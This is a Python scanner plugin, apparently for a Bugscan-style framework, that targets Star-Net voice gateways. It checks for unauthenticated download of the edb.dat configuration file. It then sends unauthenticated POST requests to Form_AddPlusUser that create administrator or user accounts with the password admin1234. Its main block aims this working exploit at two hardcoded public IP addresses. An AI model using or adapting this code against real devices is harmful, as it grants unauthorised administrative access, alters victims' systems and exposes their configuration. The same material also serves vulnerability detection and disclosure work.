#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: 星网锐捷语音网关配置下载and任意添加管理员
refer: http://www.wooyun.org/bug.php?action=view&id=135128
description:
    未授权访问
'''

import urlparse
import random

def assign(service, arg):
    if service == 'star-net':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    #配置文件（加密，目测是凯撒加密）
    url = arg + 'edb.dat'
    code, head, res, err, _ = curl.curl2(url)
    if (code == 200) and (len(res)>2000) and 'STAR-NET' in head:
        security_warning('configuration disclosure: ' + url)
    #任意添加管理员
    username = 'test_vul_' + str(random.randint(1111, 9999))
    post = 'plus_type=1&plus_username={username}&plus_password=admin1234&plus_confirm=admin1234&btn_addplus=Add'.format(username=username)
    content_type = 'Content-Type: application/x-www-form-urlencoded'
    url = arg + 'cgi-bin/Form_AddPlusUser'
    #proxy = ('127.0.0.1', 8887)
    code, head, res, err, _ = curl.curl2(url, header=content_type, post=post)
    #print code, head, res
    #flag=23/24表示添加管理员成功
    if (code == 200 or code == 302) and ('password.asp?flag=23' in res or 'password.asp?flag=24' in res):
        security_hole('任意添加管理员:' + url + ' POST:' +post)
    else:
        #添加管理员账户不成功，尝试添加普通账户（管理员账户最多有4个）
        post = 'plus_type=0&plus_username={username}&plus_password=admin1234&plus_confirm=admin1234&btn_addplus=Add'.format(username=username)
        code, head, res, err, _ = curl.curl2(url, header=content_type, post=post)
        if (code == 200 or code == 302) and ('password.asp?flag=23' in res or 'password.asp?flag=24' in res):
            security_hole('任意添加用户:' + url + ' POST:' +post)

    
if __name__ == '__main__':
    from dummy import *
    audit(assign('star-net','http://61.235.12.6/')[1])
    audit(assign('star-net','http://61.235.13.110/')[1])